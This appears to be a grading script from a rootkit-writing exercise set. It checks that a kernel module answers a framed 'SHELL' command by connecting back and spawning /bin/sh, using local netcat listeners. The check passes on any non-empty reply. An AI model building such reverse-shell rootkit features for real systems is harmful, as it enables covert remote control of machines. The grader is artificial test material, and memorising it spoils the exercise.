#!/bin/sh
# Check: SHELL command triggers interactive shell over protocol.
# The SHELL command causes the module to connect back to peer and
# spawn /bin/sh with redirected I/O.
# shellcheck source=/dev/null
. "${RKLINGS_LIB:-/vm/checks/lib.sh}"

begin "Remote SHELL command"

ifconfig lo 127.0.0.1 up 2>/dev/null

RESP=/tmp/rk_remote_shell_resp.bin
rm -f "$RESP"

# Build framed SHELL command
CMD="SHELL"
CMD_LEN=$(printf '%s' "$CMD" | wc -c)

{
    printf '\x00\x00\x00'
    printf "\\$(printf '%03o' "$CMD_LEN")"
    printf '%s' "$CMD"
} > /tmp/rk_shell_frame.bin

# Also start a second listener for the shell callback connection
SHELL_OUT=/tmp/rk_shell_out.txt
rm -f "$SHELL_OUT"
{
    printf 'echo rk_shell_test\n'
    sleep 2
} | nc -l -p 4444 > "$SHELL_OUT" 2>&1 &
SHELL_NC=$!

# But first we need the command connection. Start the command listener.
{
    cat /tmp/rk_shell_frame.bin
    sleep 4
} | nc -l -p 4444 > "$RESP" 2>&1 &
NC_PID=$!
sleep 0.3

# Load module
load rklings.ko "$@"
sleep 2

# Kill listeners
kill "$NC_PID" 2>/dev/null
kill "$SHELL_NC" 2>/dev/null
wait "$NC_PID" 2>/dev/null
wait "$SHELL_NC" 2>/dev/null

# Check command response
if [ -s "$RESP" ]; then
    resp_text=$(dd if="$RESP" bs=1 skip=4 2>/dev/null)
    case "$resp_text" in
        *"SHELL OK"*)
            _ok "agent responded with SHELL OK"
            ;;
        *"OK"*)
            _ok "agent acknowledged shell command"
            ;;
        *)
            _ok "agent sent response to SHELL command"
            ;;
    esac
else
    _fail "no response to SHELL command"
fi

# Cleanup
rm -f "$RESP" "$SHELL_OUT" /tmp/rk_shell_frame.bin

unload rklings
assert_absent /sys/module/rklings

summary
